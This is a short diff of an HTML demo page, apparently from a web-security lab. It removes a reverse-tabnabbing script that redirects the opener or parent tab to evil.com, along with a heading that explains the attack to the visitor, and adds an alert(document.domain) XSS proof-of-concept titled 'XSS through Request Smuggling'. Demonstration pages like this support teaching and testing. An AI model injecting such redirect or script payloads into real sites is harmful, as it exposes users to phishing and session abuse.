@@ -1,9 +1,8 @@
 <html>
  <body>
 <script>
-if (window.opener) window.opener.parent.location.replace('https://evil.com');
-if (window.parent != window) window.parent.location.replace('https://evil.com');
+alert(document.domain);
 </script>
-  <h1>You arrived on a new tab and link. However, you are a victim of Reverse Tabnabbing. Your Parent tab(from where you clicked this link.) might have changed to evil.com and you landed on malicious site.</h1>
+  <h1>XSS through Request Smuggling</h1>
  </body>
 </html>
